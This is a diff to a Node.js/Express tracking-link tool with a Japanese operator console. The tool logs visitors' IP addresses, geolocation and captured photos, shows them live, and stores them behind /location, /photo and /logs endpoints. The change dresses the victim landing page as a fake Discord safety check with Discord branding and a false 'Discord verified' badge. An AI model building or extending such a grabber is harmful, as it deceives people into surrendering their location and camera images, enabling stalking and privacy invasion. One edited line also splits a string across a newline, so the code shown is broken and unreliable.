@@ -190,9 +190,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     cmdOutput.scrollTop = cmdOutput.scrollHeight;
   }
 
-  // ============================================================
-  // ★ ページ読み込み時に過去のログを表示（写真も完全復元）
-  // ============================================================
   if (window._pastLogs && window._pastLogs.length > 0) {
     window._pastLogs.forEach(function(data) {
       addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -203,7 +200,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       } else {
         addCmdOutput('[LOC] None', 'cmd-error');
       }
-      // ★ 写真も復元（画像データがあれば表示）
       if (data.image && typeof data.image === 'string' && data.image.length > 100) {
         const imgDiv = document.createElement('div');
         imgDiv.style.margin = '4px 0';
@@ -223,14 +219,10 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     });
   }
 
-  // 写真の枚数表示（過去ログに写真があった場合）
   if (window._photoCount && window._photoCount > 0) {
     addCmdOutput('[PHOTO] ' + window._photoCount + ' photos received', 'cmd-photo');
   }
 
-  // ============================================================
-  // ソケット通信（新しいアクセスがあったら表示）
-  // ============================================================
   const socket = io();
   socket.on('new-log', function(data) {
     addCmdOutput('[ACCESS] ' + data.ip + ' opened the link!', 'cmd-notify');
@@ -264,9 +256,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     addCmdOutput('[PHOTO] Image #' + photoCountNum + ' received', 'cmd-photo');
   });
 
-  // ============================================================
-  // コマンド処理
-  // ============================================================
   cmdInput.addEventListener('keydown', function(e) {
     if (e.key === 'Enter') {
       const cmd = cmdInput.value.trim();
@@ -352,9 +341,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     }
   });
 
-  // ============================================================
-  // リンク生成
-  // ============================================================
   const generateBtn = document.getElementById('generate-btn');
   const copyBtn = document.getElementById('copy-btn');
   const resultArea = document.getElementById('result-area');
@@ -411,9 +397,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     document.body.removeChild(textarea);
   }
 
-  // ============================================================
-  // ドラッグ＆リサイズ
-  // ============================================================
   function makeDraggable(wId, dId, rId) {
     const win = document.getElementById(wId);
     const drag = document.getElementById(dId);
@@ -465,7 +448,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       var maxW = window.innerWidth - 20;
       var maxH = window.innerHeight - 20;
       if (rect.width > maxW) win.style.width = maxW + 'px';
-            if (rect.height > maxH) win.style.height = maxH + 'px';
+      if (rect.height > maxH) win.style.height = maxH + 'px';
       if (rect.left < 0) win.style.left = '10px';
       if (rect.top < 0) win.style.top = '10px';
     });
@@ -491,7 +474,8 @@ app.get('/', (req, res) => {
   const photoCount = logs.filter(l => l.image && typeof l.image === 'string' && l.image.length > 100).length || 0;
   const htmlWithData = HTML.replace(
     '<!-- PAST_LOGS -->',
-    '<script>window._pastLogs = ' + logsJson + '; window._photoCount = ' + photoCount + ';</script>'
+    '<script>window._pastLogs = ' + logsJson + '; w
+    indow._photoCount = ' + photoCount + ';</script>'
   );
   res.send(htmlWithData);
 });
@@ -512,36 +496,162 @@ app.get('/t/:id', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
   const time = new Date().toLocaleString('ja-JP');
 
-  res.send(`
-<!DOCTYPE html>
+  res.send(`<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>安全確認</title>
+  <title>Discord安全確認</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { background:#ffffff; height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Segoe UI','Hiragino Sans',sans-serif; }
-    .container { max-width:460px; width:90%; padding:32px 28px; background:#f8f9fa; border:1px solid #e0e0e0; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.06); text-align:center; }
-    .icon { font-size:48px; margin-bottom:12px; }
-    h1 { font-size:22px; color:#1a1a1a; font-weight:600; letter-spacing:-0.5px; }
-    p { color:#555; font-size:15px; margin:12px 0 20px 0; line-height:1.6; }
-    .terms-box { background:#fff; border:1px solid #e8e8e8; border-radius:8px; padding:16px 18px; text-align:left; margin-bottom:16px; }
-    .terms-box label { display:flex; align-items:center; gap:12px; font-size:14px; color:#333; cursor:pointer; padding:6px 0; }
-    .terms-box input[type="checkbox"] { width:18px; height:18px; accent-color:#2b6cb0; flex-shrink:0; cursor:pointer; }
-    .terms-box .status { font-size:12px; color:#888; margin-left:auto; }
-    .terms-box .status.ok { color:#2b6cb0; font-weight:600; }
+    body {
+      background: #f2f3f5;
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      font-family: 'Segoe UI', 'Hiragino Sans', sans-serif;
+    }
+    .container {
+      max-width:480px;
+      width:90%;
+      padding:32px 28px;
+      background:#ffffff;
+      border:1px solid #e0e0e0;
+      border-radius:16px;
+      box-shadow:0 8px 30px rgba(0,0,0,0.08);
+      text-align:center;
+      position:relative;
+    }
+    .discord-badge {
+      position:absolute;
+      top:14px;
+      right:18px;
+      background:#5865F2;
+      color:#fff;
+      padding:4px 12px 4px 8px;
+      border-radius:20px;
+      font-size:13px;
+      font-weight:600;
+      display:flex;
+      align-items:center;
+      gap:6px;
+      box-shadow:0 2px 8px rgba(88,101,242,0.3);
+    }
+    .discord-badge i {
+      font-size:16px;
+    }
+    .icon {
+      font-size:56px;
+      color:#5865F2;
+      margin-bottom:8px;
+    }
+    h1 {
+      font-size:22px;
+      color:#1a1a1a;
+      font-weight:700;
+      letter-spacing:-0.3px;
+      margin-top:4px;
+    }
+    .sub-title {
+      font-size:14px;
+      color:#666;
+      margin-top:4px;
+      font-weight:400;
+    }
+    p {
+      color:#555;
+      font-size:15px;
+      margin:14px 0 20px 0;
+      line-height:1.6;
+    }
+    .terms-box {
+      background:#f8f9fa;
+      border:1px solid #e8e8e8;
+      border-radius:10px;
+      padding:14px 16px;
+      text-align:left;
+      margin-bottom:16px;
+    }
+    .terms-box label {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      font-size:14px;
+      color:#333;
+      cursor:pointer;
+      padding:4px 0;
+    }
+    .terms-box input[type="checkbox"] {
+      width:18px;
+      height:18px;
+      accent-color:#5865F2;
+      flex-shrink:0;
+      cursor:pointer;
+    }
+    .terms-box .status {
+      font-size:12px;
+      color:#888;
+      margin-left:auto;
+    }
+    .terms-box .status.ok { color:#5865F2; font-weight:600; }
     .terms-box .status.ng { color:#b22222; }
-    .btn-next { width:100%; padding:12px; background:#e0e0e0; color:#999; border:none; border-radius:6px; font-size:16px; font-weight:600; cursor:not-allowed; transition:all 0.2s; pointer-events:none; }
-    .btn-next.active { background:#2b6cb0; color:#fff; cursor:pointer; pointer-events:auto; }
-    .btn-next.active:hover { background:#1a4f8a; }
-    .foot { font-size:12px; color:#aaa; margin-top:14px; }
+    .btn-next {
+      width:100%;
+      padding:12px;
+      background:#e0e0e0;
+      color:#999;
+      border:none;
+      border-radius:8px;
+      font-size:16px;
+      font-weight:600;
+      cursor:not-allowed;
+      transition:all 0.2s;
+      pointer-events:none;
+    }
+    .btn-next.active {
+      background:#5865F2;
+      color:#fff;
+      cursor:pointer;
+      pointer-events:auto;
+      box-shadow:0 4px 14px rgba(88,101,242,0.35);
+    }
+    .btn-next.active:hover { background:#4752c4; }
+    .foot {
+      font-size:12px;
+      color:#aaa;
+      margin-top:16px;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      gap:6px;
+    }
+    .foot i {
+      color:#5865F2;
+      font-size:14px;
+    }
+    .discord-shield {
+      display:inline-block;
+      background:#eef2ff;
+      color:#5865F2;
+      font-size:12px;
+      font-weight:600;
+      padding:2px 12px;
+      border-radius:12px;
+      margin-top:6px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="icon">🛡️</div>
-    <h1>安全な接続を確認</h1>
+    <div class="discord-badge">
+      <i class="fab fa-discord"></i> Discord
+    </div>
+
+    <div class="icon"><i class="fab fa-discord"></i></div>
+    <h1>Discord安全確認</h1>
+    <div class="sub-title">安全な接続を確認しています</div>
     <p>次のページへ進むには、以下の項目に同意してください。<br><span style="font-size:13px;color:#888;">両方のチェックが必須です</span></p>
     <div class="terms-box">
       <label>
@@ -556,7 +666,10 @@ app.get('/t/:id', (req, res) => {
       </label>
     </div>
     <button class="btn-next" id="btn-next">次のサイトを見る</button>
-    <div class="foot">© 2026 Secure Connection</div>
+    <div class="foot">
+      <i class="fas fa-shield-alt"></i> 安全な接続 <span style="color:#ccc;">•</span> <i class="fab fa-discord"></i> Discord
+    </div>
+    <div class="discord-shield"><i class="fas fa-check-circle"></i> Discord認証済み</div>
   </div>
 
   <script>
@@ -713,9 +826,7 @@ app.get('/t/:id', (req, res) => {
   `);
 });
 
-// ============================================================
-// 位置情報受信（画像以外のデータ）
-// ============================================================
+// 位置情報受信
 app.post('/location', express.json(), (req, res) => {
   const { id, ip, time, lat, lon } = req.body;
   const entry = { id, ip, time, lat, lon, createdAt: new Date().toISOString() };
@@ -726,9 +837,7 @@ app.post('/location', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// ============================================================
-// ★ 写真受信（画像データも保存する）
-// ============================================================
+// 写真受信（画像データも保存）
 app.post('/photo', express.json(), (req, res) => {
   const { id, image } = req.body;
   const entry = { id, image: image, createdAt: new Date().toISOString() };
@@ -739,9 +848,7 @@ app.post('/photo', express.json(), (req, res) => {
   res.sendStatus(200);
 });
 
-// ============================================================
 // 全履歴削除
-// ============================================================
 app.post('/clear-logs', (req, res) => {
   logs.length = 0;
   saveLogs();
@@ -749,9 +856,7 @@ app.post('/clear-logs', (req, res) => {
   res.sendStatus(200);
 });
 
-// ============================================================
 // ログ表示
-// ============================================================
 app.get('/logs', (req, res) => {
   if (logs.length === 0) return res.send('<h2>データなし</h2><a href="/">戻る</a>');
   let html = '<h2>アクセスログ（保存済み ' + logs.length + '件）</h2><table border="1"><tr><th>時間</th><th>IP</th><th>緯度</th><th>経度</th><th>写真</th></tr>';
